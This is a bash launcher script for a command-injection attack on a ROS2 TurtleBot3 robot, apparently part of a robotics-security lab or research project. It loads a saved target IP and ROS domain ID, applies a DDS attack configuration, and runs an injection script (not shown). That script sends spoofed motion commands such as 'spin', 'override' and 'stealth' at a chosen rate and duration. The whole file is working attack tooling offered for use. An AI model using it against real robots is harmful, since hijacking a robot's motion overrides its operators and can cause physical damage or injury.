#!/bin/bash
# Quick attack launcher - simple one-command attack
# Usage: ./quick_attack.sh [attack_type] [frequency] [duration]

echo "=========================================="
echo "Quick Attack Launcher"
echo "=========================================="
echo ""

# Setup ROS2 environment
if [ -z "$ROS_DISTRO" ]; then
    source /opt/ros/jazzy/setup.bash 2>/dev/null || source /opt/ros/humble/setup.bash 2>/dev/null
fi
export TURTLEBOT3_MODEL=burger

# Get script directory
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
NETWORK_DIR="$(cd "$SCRIPT_DIR/.." && pwd)"

# Load saved configuration if exists
if [ -f "$NETWORK_DIR/target_ip.txt" ]; then
    target_ip=$(cat "$NETWORK_DIR/target_ip.txt")
    domain_id=$(cat "$NETWORK_DIR/target_domain_id.txt" 2>/dev/null || echo "0")
    export ROS_DOMAIN_ID=$domain_id
    
    if [ -f "$NETWORK_DIR/dds_attack_config.xml" ]; then
        export CYCLONEDDS_URI=file://$NETWORK_DIR/dds_attack_config.xml
    fi
fi

# Parse arguments or use defaults
ATTACK_TYPE=${1:-turn_left}
ATTACK_FREQ=${2:-50}
ATTACK_DURATION=${3:-15}

# Set extra args based on attack type
case $ATTACK_TYPE in
    turn_left|spin)
        EXTRA_ARGS="--angular-speed 0.5"
        ;;
    override|stealth)
        EXTRA_ARGS="--speed 0.5"
        ;;
    interference)
        EXTRA_ARGS=""
        ;;
    *)
        EXTRA_ARGS="--angular-speed 0.5"
        ;;
esac

echo "Quick Attack Configuration:"
echo "  Type: $ATTACK_TYPE"
echo "  Frequency: $ATTACK_FREQ Hz"
echo "  Duration: $ATTACK_DURATION seconds"
echo ""

# Get path to injection_attack.py
INJECTION_SCRIPT="$(cd "$SCRIPT_DIR/../../scripts" && pwd)/injection_attack.py"

if [ ! -f "$INJECTION_SCRIPT" ]; then
    echo "Error: injection_attack.py not found"
    exit 1
fi

# Launch attack
python3 "$INJECTION_SCRIPT" \
    --attack-type "$ATTACK_TYPE" \
    --frequency "$ATTACK_FREQ" \
    --duration "$ATTACK_DURATION" \
    --node-name "network_attacker" \
    $EXTRA_ARGS

echo ""
echo "Attack completed!"

